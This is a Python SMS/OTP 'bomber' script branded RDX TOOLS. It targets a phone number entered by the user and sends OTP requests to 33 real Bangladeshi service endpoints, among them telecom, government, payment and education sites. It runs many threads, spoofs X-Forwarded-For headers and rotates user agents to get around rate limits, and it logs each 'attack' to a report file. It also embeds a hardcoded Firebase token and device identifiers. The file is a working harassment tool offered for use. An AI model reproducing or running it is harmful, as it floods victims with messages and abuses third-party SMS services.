import requests
import time
import os
import sys
import random
import json
import shutil
from threading import Thread, Lock
import ctypes

# --- কনফিগারেশন ---
TOOL_NAME = "RDX TOOLS"
CREATOR_NAME = "RDX HUNTER"
FB_ID = "RDX HUNTER"
TELEGRAM_USER = ""
TELEGRAM_GROUP = "https://t.me/rdx_tools"

# --- ৩৩টি আসল API টেমপ্লেট (প্রথম ২টি ডিলিট করা) ---
API_TEMPLATES = [
    ("POST", "https://core.easy.com.bd/api/v1/forgot-password-otp",
        {"device_key": "2ea97d276a980993308116baa292cec9", "mobile": "{phone}"}),
    ("GET", "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", None),
    ("POST", "https://api.chardike.com/api/otp/send", {"phone": "{phone}", "otp_type": "login"}),
    ("POST", "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
        {"phoneNbr": "{phone}", "OTPType": 1.0, "userName": "", "email": ""}),
    ("POST", "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", {"phone": "{phone}"}),
    ("POST", "https://gateway.otithee.com/api/v1/generate-otp",
        {"request_type": "registration", "mobile_number": "{phone}"}),
    ("POST", "https://developer.quizgiri.xyz/api/v2.0/send-otp",
        {"country_code": "+88", "phone": "{phone}"}),
    ("POST", "https://new.mojaru.com/api/student/login", {"mobile_or_email": "{phone}"}),
    ("POST", "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", {"mobileNumber": "{phone}"}),
    ("POST", "https://api.garibookadmin.com/api/v3/user/login",
        {"recaptcha_token": "garibookcaptcha", "mobile": "{phone}", "channel": "web"}),
    ("POST", "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("GET", "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}", None),
    ("POST", "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
        {"wallet_number": "{phone}",
         "geo_location": {"lat": 23.8979093, "long": 89.1356346},
         "referral": "",
         "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI",
         "device_uuid": "c65m117a8cbf5b1851b29f8b",
         "mno": "Robi"}),
    ("POST", "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
        {"number": "{phone+880}"}),
    ("POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
        {"phoneNumber": "{phone}"}),
    ("POST", "https://bb-api.bohubrihi.com/public/activity/otp", {"phone": "{phone}", "intent": "login"}),
    ("POST", "https://backend.timezonebd.com/api/v1/user/otp-login", {"phone": "{phone}"}),
    ("POST", "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
        {"phone": "{phone}", "language": "en", "email": ""}),
    ("POST", "https://api.shikho.com/public/activity/otp", {"phone": "{phone}", "intent": "ap-discount-request"}),
    ("POST", "https://edgecoursebd.com/register", [{"phone": "{phone}"}]),
    ("POST", "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
        {"mobile_no": "{phone}"}),
    ("POST", "https://api.ostad.app/api/v2/user/with-otp", {"msisdn": "{phone}"}),
    ("POST", "https://www.ieducationbd.com/api/account/check_user", {"mobile": "{phone}"}),
    ("POST", "https://api.garibookadmin.com/api/v4/user/login",
        {"mobile": "{phone+880}", "recaptcha_token": "garibookcaptcha", "channel": "web"}),
    ("POST", "https://www.shwapno.com/api/auth", {"phoneNumber": "{phone+880}"}),
    ("POST", "https://api.doctime.net/api/v2/authenticate",
        {"country_calling_code": "88", "contact_no": "{phone}", "timestamp": 1777760060}),
    ("POST", "https://mbonlineapi.com/api/front/send/otp", {"CellPhone": "{phone}", "type": "login"}),
    ("POST", "https://www.robi.com.bd/en", [{"msisdn": "{phone}"}]),
    ("POST", "https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": "{phone}"}),
    ("POST", "https://frontendapi.kireibd.com/api/v2/send-login-otp", {"email": "{phone}"}),
    ("GET", "https://api.karigoripathsala.com/api/get-otp?phone={phone}", None),
    ("POST", "https://api.binge.buzz/api/v4/auth/otp/send", {"phone": "{phone+880}"}),
]


def replace_placeholders(obj, clean_phone):
    if isinstance(obj, dict):
        return {k: replace_placeholders(v, clean_phone) for k, v in obj.items()}
    if isinstance(obj, list):
        return [replace_placeholders(i, clean_phone) for i in obj]
    if isinstance(obj, str):
        return obj.replace("{phone+880}", f"+880{clean_phone}").replace("{phone}", clean_phone)
    return obj


def build_api_list(phone: str):
    clean_phone = phone.replace("+880", "").replace("880", "", 1) \
        if phone.startswith(("+880", "880")) else phone

    api_list = []
    for method, url, payload in API_TEMPLATES:
        final_url = url.replace("{phone+880}", f"+880{clean_phone}").replace("{phone}", clean_phone)
        final_payload = replace_placeholders(payload, clean_phone)
        api_list.append({"method": method, "url": final_url, "payload": final_payload})
    return api_list


# --- কালার ক্লাস ---
class C:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;135m'
    PINK = '\033[38;5;213m'


def set_title(title):
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        print(f"\033]0;{title}\007", end='')


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def get_terminal_width():
    try:
        return shutil.get_terminal_size((80, 20)).columns
    except Exception:
        return 80


# --- সুন্দর ও স্টেবল ব্যানার ---
def banner():
    clear_screen()
    width = min(get_terminal_width(), 80)
    line = "═" * (width - 4)

    art = [
        "  ██████╗ ██████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗",
        "  ██╔══██╗██╔══██╗╚██╗██╔╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝",
        "  ██████╔╝██║  ██║ ╚███╔╝        ██║   ██║   ██║██║   ██║██║     ███████╗",
        "  ██╔══██╗██║  ██║ ██╔██╗        ██║   ██║   ██║██║   ██║██║     ╚════██║",
        "  ██║  ██║██████╔╝██╔╝ ██╗       ██║   ╚██████╔╝╚██████╔╝███████╗███████║",
        "  ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝",
    ]

    print(f"{C.CYAN}╔{line}╗{C.RESET}")
    print(f"{C.CYAN}║{C.RESET}{' ' * (width - 4)}{C.CYAN}║{C.RESET}")

    for art_line in art:
        padding = max(0, (width - 4 - len(art_line)) // 2)
        print(f"{C.CYAN}║{C.RESET}{' ' * padding}{C.MAGENTA}{C.BOLD}{art_line}{C.RESET}"
              f"{' ' * max(0, width - 4 - padding - len(art_line))}{C.CYAN}║{C.RESET}")

    print(f"{C.CYAN}║{C.RESET}{' ' * (width - 4)}{C.CYAN}║{C.RESET}")
    print(f"{C.CYAN}╠{line}╣{C.RESET}")

    info_lines = [
        (f"  ⚡ TOOL NAME  ", f"{TOOL_NAME}"),
        (f"  👤 CREATOR    ", f"{CREATOR_NAME}"),
        (f"  📘 FACEBOOK   ", f"{FB_ID}"),
        (f"  ✈️  TELEGRAM   ", f"{TELEGRAM_USER if TELEGRAM_USER else 'N/A'}"),
        (f"  🔗 GROUP LINK ", f"{TELEGRAM_GROUP}"),
        (f"  🚀 APIs LOADED", f"{len(API_TEMPLATES)}"),
    ]

    for label, value in info_lines:
        content = f"{C.YELLOW}{label}{C.WHITE} : {C.GREEN}{value}{C.RESET}"
        # visible length calculation (without color codes)
        visible = len(label) + 3 + len(value) + 2
        padding = max(0, width - 4 - visible)
        print(f"{C.CYAN}║{C.RESET} {content}{' ' * padding} {C.CYAN}║{C.RESET}")

    print(f"{C.CYAN}╚{line}╝{C.RESET}")


# --- হেডার ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]


def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Connection': 'keep-alive'
    }


# --- গ্লোবাল ---
lock = Lock()
stats = {"total": 0, "success": 0, "failed": 0}
stop_flag = {"stop": False}


def get_target():
    print(f"\n{C.CYAN}┌{'─' * 50}┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.GREEN}🎯 TARGET NUMBER SETUP{C.RESET}"
          f"{' ' * 28}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└{'─' * 50}┘{C.RESET}")
    print(f"{C.YELLOW}  ▸ Format: 01712345678 / 8801712345678{C.RESET}")
    number = input(f"{C.MAGENTA}  ▶ Enter Number: {C.RESET}").strip()
    return number


def get_thread_count():
    print(f"\n{C.CYAN}┌{'─' * 50}┐{C.RESET}")
    print(f"{C.CYAN}│{C.RESET} {C.GREEN}⚙️  THREAD CONFIGURATION{C.RESET}"
          f"{' ' * 26}{C.CYAN}│{C.RESET}")
    print(f"{C.CYAN}└{'─' * 50}┘{C.RESET}")
    print(f"{C.YELLOW}  ▸ Recommended: 10-30 (more = faster){C.RESET}")
    try:
        n = int(input(f"{C.MAGENTA}  ▶ Threads (default 15): {C.RESET}").strip() or "15")
        return max(1, n)
    except ValueError:
        return 15


def call_api(api, timeout=8):
    try:
        if api["method"] == "GET":
            resp = requests.get(api["url"], headers=get_random_headers(), timeout=timeout)
        else:
            resp = requests.post(api["url"], json=api["payload"],
                                 headers=get_random_headers(), timeout=timeout)
        return resp.status_code
    except requests.exceptions.Timeout:
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        return "CONN_ERR"
    except Exception:
        return "ERROR"


# --- সুন্দর স্পিনার অ্যানিমেশন ---
SPINNER_FRAMES = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
PULSE_FRAMES = ['●', '◉', '○', '◌']


def bomb_thread(target_number, thread_id, api_pool):
    spinner_idx = 0
    pulse_idx = 0

    while not stop_flag["stop"]:
        try:
            api = random.choice(api_pool)
            display = api["url"].split('/')[2]
            # ডোমেইন নাম ছোট করা
            if len(display) > 24:
                display = display[:22] + ".."

            status = call_api(api)

            spinner = SPINNER_FRAMES[spinner_idx % len(SPINNER_FRAMES)]
            pulse = PULSE_FRAMES[pulse_idx % len(PULSE_FRAMES)]
            spinner_idx += 1
            pulse_idx += 1

            with lock:
                stats["total"] += 1
                if isinstance(status, int) and 200 <= status < 300:
                    stats["success"] += 1
                    status_color = C.GREEN
                    status_text = f"{pulse} OK"
                elif isinstance(status, int) and 400 <= status < 500:
                    stats["failed"] += 1
                    status_color = C.YELLOW
                    status_text = f"⚠ {status}"
                else:
                    stats["failed"] += 1
                    status_color = C.RED
                    status_text = f"✖ {status}"

                # Live progress bar
                bar_width = 20
                total = stats["total"]
                ok_ratio = stats["success"] / total if total else 0
                filled = int(bar_width * ok_ratio)
                bar = f"{C.GREEN}{'█' * filled}{C.DIM}{'░' * (bar_width - filled)}{C.RESET}"

                line = (
                    f"\r{C.CYAN}[T-{thread_id:02d}]{C.RESET} "
                    f"{C.MAGENTA}{spinner}{C.RESET} "
                    f"{status_color}{status_text:<8}{C.RESET} "
                    f"{C.WHITE}{display:<24}{C.RESET} "
                    f"│ {bar} "
                    f"{C.CYAN}Σ {total:<6}{C.RESET} "
                    f"{C.GREEN}✓ {stats['success']:<5}{C.RESET}"
                    f"{C.RED}✗ {stats['failed']:<5}{C.RESET}"
                )
                print(line, end='', flush=True)

            time.sleep(random.uniform(0.2, 1.0))

        except KeyboardInterrupt:
            stop_flag["stop"] = True
            break
        except Exception:
            with lock:
                stats["failed"] += 1
            time.sleep(0.5)


if __name__ == "__main__":
    set_title(f"{TOOL_NAME} — {CREATOR_NAME}")
    banner()

    target = get_target()
    if not target:
        print(f"{C.FAIL}  ✖ Invalid number!{C.RESET}")
        sys.exit()

    full_api_list = build_api_list(target)

    thread_count = get_thread_count()

    print(f"\n{C.CYAN}{'═' * 60}{C.RESET}")
    print(f"  {C.GREEN}🚀 SYSTEM INITIALIZED{C.RESET}")
    print(f"  {C.WHITE}Target     : {C.YELLOW}{target}{C.RESET}")
    print(f"  {C.WHITE}APIs Loaded: {C.YELLOW}{len(full_api_list)}{C.RESET}")
    print(f"  {C.WHITE}Threads    : {C.YELLOW}{thread_count}{C.RESET}")
    print(f"  {C.WHITE}Mode       : {C.GREEN}ALL APIs (Random Rotation){C.RESET}")
    print(f"{C.CYAN}{'═' * 60}{C.RESET}")

    print(f"\n{C.MAGENTA}{C.BOLD}  💣 LAUNCHING ATTACK...{C.RESET}")
    print(f"{C.YELLOW}  ⏹  Press Ctrl+C to STOP{C.RESET}\n")

    time.sleep(1)

    threads = []
    for i in range(thread_count):
        t = Thread(target=bomb_thread, args=(target, i + 1, full_api_list))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(0.2)
    except KeyboardInterrupt:
        stop_flag["stop"] = True

    print(f"\n\n{C.CYAN}{'═' * 60}{C.RESET}")
    print(f"  {C.RED}{C.BOLD}⏹  ATTACK TERMINATED{C.RESET}")
    print(f"{C.CYAN}{'═' * 60}{C.RESET}")
    print(f"  {C.WHITE}Target     : {C.YELLOW}{target}{C.RESET}")
    print(f"  {C.WHITE}Total Sent : {C.CYAN}{stats['total']}{C.RESET}")
    print(f"  {C.WHITE}Success    : {C.GREEN}{stats['success']}{C.RESET}")
    print(f"  {C.WHITE}Failed     : {C.RED}{stats['failed']}{C.RESET}")
    if stats["total"]:
        rate = stats["success"] / stats["total"] * 100
        print(f"  {C.WHITE}Hit Rate   : {C.MAGENTA}{rate:.1f}%{C.RESET}")
    print(f"{C.CYAN}{'═' * 60}{C.RESET}\n")

    try:
        with open("attack_report.json", "w", encoding="utf-8") as f:
            json.dump({
                "tool": TOOL_NAME,
                "creator": CREATOR_NAME,
                "target": target,
                "threads": thread_count,
                "total_apis": len(full_api_list),
                "total": stats["total"],
                "success": stats["success"],
                "failed": stats["failed"],
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            }, f, indent=2, ensure_ascii=False)
        print(f"{C.GREEN}  💾 Report saved: attack_report.json{C.RESET}\n")
    except Exception:
        pass

    sys.exit()
